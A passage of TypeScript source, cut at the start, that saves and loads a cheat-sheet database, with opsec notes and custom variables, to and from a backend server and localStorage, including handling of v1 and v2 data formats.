  try {
    // Get fresh data from localStorage
    const freshData = loadFreshFromStorage();
    const opsecNotes = getOpsecNotes();
    const customVariables = getCustomVariables();

    // Normalize all sheets
    const normalizedSheets = freshData.map(normalizeCheatSheet);

    // Create full export with version 2 format
    const fullExport: FullDatabaseExport = {
      version: 2,
      cheatSheets: normalizedSheets,
      opsecNotes,
      customVariables,
    };

    console.log("[CheatSheets] Saving to server:", fullExport);

    const response = await fetch(`${CHEATSHEET_BACKEND_URL}/saveCheatSheets`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(fullExport),
    });

    if (!response.ok) {
      throw new Error(`Server returned ${response.status}: ${response.statusText}`);
    }

    console.log("[CheatSheets] Successfully saved to server");
    return { success: true };
  } catch (error) {
    console.error("[CheatSheets] Failed to save to server:", error);
    return { success: false, error: String(error) };
  }
};

/**
 * Load cheat sheets database from backend server.
 * Fetches data and updates both localStorage and in-memory cache.
 */
export const loadCheatSheetsDatabaseFromServer = async (): Promise<{
  success: boolean;
  count: number;
  error?: string;
}> => {
  try {
    console.log("[CheatSheets] Loading from server...");

    const response = await fetch(`${CHEATSHEET_BACKEND_URL}/loadCheatSheets`, {
      method: "GET",
      headers: { "Content-Type": "application/json" },
    });

    if (!response.ok) {
      throw new Error(`Server returned ${response.status}: ${response.statusText}`);
    }

    const data = await response.json();

    let sheetsToLoad: CheatSheetData[];
    let opsecNotesToLoad: Record<string, string> = {};
    let customVariablesToLoad: Array<{ id: string; name: string; value: string }> = [];

    // Handle v2 format (object with version)
    if (data && typeof data === "object" && data.version === 2) {
      if (!Array.isArray(data.cheatSheets)) {
        return { success: false, count: 0, error: "Invalid v2 format from server" };
      }
      sheetsToLoad = data.cheatSheets;
      opsecNotesToLoad = data.opsecNotes || {};
      customVariablesToLoad = data.customVariables || [];
    }
    // Handle v1 format (direct array)
    else if (Array.isArray(data)) {
      sheetsToLoad = data;
    } else {
      return { success: false, count: 0, error: "Invalid format from server" };
    }

    // Deep clone and save to localStorage
    const cleanData = deepClone(sheetsToLoad);
    saveDatabase(cleanData);
    saveOpsecNotes(opsecNotesToLoad);
    saveCustomVariables(customVariablesToLoad);

    // Update in-memory cache
    cheatSheetsDatabase = loadFreshFromStorage();

    console.log("[CheatSheets] Successfully loaded from server:", cleanData.length, "sheets");
    return { success: true, count: cleanData.length };
  } catch (error) {
    console.error("[CheatSheets] Failed to load from server:", error);
    return { success: false, count: 0, error: String(error) };
  }
};
